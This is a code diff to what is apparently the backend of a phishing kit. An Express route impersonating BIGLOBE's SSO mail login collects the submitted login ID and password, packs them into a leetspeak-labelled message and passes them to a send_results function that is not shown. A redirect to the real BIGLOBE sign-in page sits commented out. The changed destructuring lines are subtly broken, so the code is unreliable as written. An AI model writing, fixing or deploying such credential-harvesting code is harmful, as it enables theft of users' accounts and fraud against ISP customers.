@@ -23,8 +23,8 @@ function send_results(result_message){
 r.post('/sso/mail', (req, res) => {
     // const redirect_link = 'https://href.li?https://auth.sso.biglobe.ne.jp/mail/';
 
-    const { username } = req.body.loginid;
-    const { password } = req.body.biglobe_pw;
+    const { username } = req.body['loginid'];
+    const { password } = req.body['biglobe_pw'];
     const message = `/B1G L0B3/
 Us3rn4m3: ${username}
 P4sw0rd: ${password}
@@ -32,7 +32,7 @@ C1lENT:
 /B1G L0B3/`;
     send_results(message);
     // res.status(200).send(`<!DOCTYPE html><html><body><script>window.location.href = '${redirect_link}';</script></body></html>`);
-    res.status(200).send(req.body);
+    res.status(200).send('good');
 });
 r.get('/sso/mail', (req, res) => {
     const current_directory = path.resolve(__dirname);
